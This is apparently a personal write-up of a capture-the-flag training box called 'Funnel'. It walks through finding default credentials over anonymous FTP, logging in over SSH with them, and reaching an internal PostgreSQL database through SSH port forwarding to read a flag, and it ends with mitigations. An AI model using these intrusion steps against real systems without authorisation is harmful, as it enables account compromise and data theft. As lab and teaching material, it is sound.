# Funnel | Very Easy | 2026-07-03

## Summary
Funnel is a Linux box exposing FTP on port 21 and SSH on port 22. Anonymous FTP access revealed a mail_backup directory containing a password policy PDF and a welcome email listing team usernames with a default password. SSH credential spraying identified Christine as the user who had not changed her default password. Post-foothold enumeration revealed PostgreSQL running internally on port 5432, inaccessible externally. SSH local port forwarding tunnelled the internal service to Kali, allowing psql to connect and extract the flag from the secrets database.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't connect "closed" port on external scan to a running internal service | Port 5432 showed as closed externally but PostgreSQL was running localhost-bound -- confirmed via ss -tlnp after SSH foothold |
| Didn't know how to reach a localhost-bound service from outside the machine | SSH local port forwarding (-L) tunnels a local Kali port through the SSH session to the internal service -- psql then connects via localhost:1234 |

---

## Recon
- **Nmap command:** `nmap -p- --min-rate 5000 -T4 10.129.x.x` then `nmap -sV -sC -p 21,22 10.129.x.x`
- **Open ports / services found:**
  - `21` -- FTP (vsftpd, anonymous login enabled)
  - `22` -- SSH (OpenSSH)
  - `5432` -- PostgreSQL (state: closed externally -- localhost bound)
- **Interesting observations:** FTP allowed anonymous login, PostgreSQL showed as closed externally indicating localhost-only binding

---

## Enumeration

### FTP anonymous access
```bash
ftp 10.129.x.x
# username: anonymous
# password: (blank)
ls
cd mail_backup
ls
mget *
```
- Found two files: `password_policy.pdf` and a welcome email
- PDF contained the default password all new team members should change
- Email listed team usernames: christine, optionally others

### Credential spraying (manual in this case)
```bash
ssh christine@10.129.x.x
# password: <default from PDF>
```
- Christine had not changed her default password -- SSH access granted


### Post-foothold internal enumeration
```bash
ss -tlnp
# or
nmap -sV -p- 127.0.0.1
```
- PostgreSQL confirmed running on localhost:5432
- Not accessible externally -- requires port forwarding

---

## Foothold
- **Vulnerability:** Anonymous FTP exposing internal mail backup containing default credentials
- **CVE:** N/A -- misconfiguration
- **Exact commands:**

```bash
# Establish SSH local port forward -- tunnel localhost:5432 on target to localhost:1234 on Kali
ssh -L 1234:localhost:5432 -N -f christine@10.129.x.x

# Confirm tunnel is listening
ss -tlnp | grep 1234

# Connect to PostgreSQL through tunnel
psql -U christine -h localhost -p 1234
```

- **Why it worked:** FTP anonymous access exposed internal documents containing credentials. Christine reused the default password on SSH. PostgreSQL was localhost-bound but SSH local port forwarding tunnelled the connection through the authenticated SSH session, making the internal service accessible from Kali.

---

## Privilege Escalation
- N/A -- flag was found in PostgreSQL database without requiring OS-level privesc

---

## Database Navigation
```sql
\l                        -- list databases
\c secrets                -- connect to secrets database
\dt                       -- list tables
SELECT * FROM flag;        -- read flag
\q                        -- quit
```

---

## Tools Used
- nmap
- ftp
- ssh (with local port forwarding)
- crackmapexec (spraying concept)
- psql

---

## Key Takeaways
- **Anonymous FTP + sensitive files = critical finding** -- internal documents, emails, and policy files should never be in an FTP directory accessible without credentials
- **Default passwords are a genuine attack vector** -- one user not following password policy was enough for full access
- **Closed port on external scan does not mean no service** -- check internally after foothold with ss -tlnp or nmap against localhost
- **SSH local port forwarding (-L)** -- maps a local port on Kali to an internal service on the target through an SSH tunnel, making localhost-bound services accessible externally
- **Dynamic tunnel alternative** -- ssh -D creates a SOCKS proxy forwarding all traffic through SSH, more flexible when targeting multiple internal services
- **PostgreSQL vs MySQL syntax** -- backslash commands (\l, \dt, \c) instead of SQL keywords for navigation; SELECT statements remain identical
- **What would have stopped this:**
  - Disable FTP anonymous login
  - Never store credential documents in FTP directories
  - Enforce password change on first login
  - Bind PostgreSQL to localhost only is correct -- but combine with strong credentials
  - Monitor for credential spraying via failed SSH login alerts

---

## Index Entry
| Box | Difficulty | Key Technique | CVE | Date |
|-----|------------|---------------|-----|------|
| Funnel | Very Easy | Anonymous FTP credential exposure + SSH port forwarding | N/A | 2026-07-03 |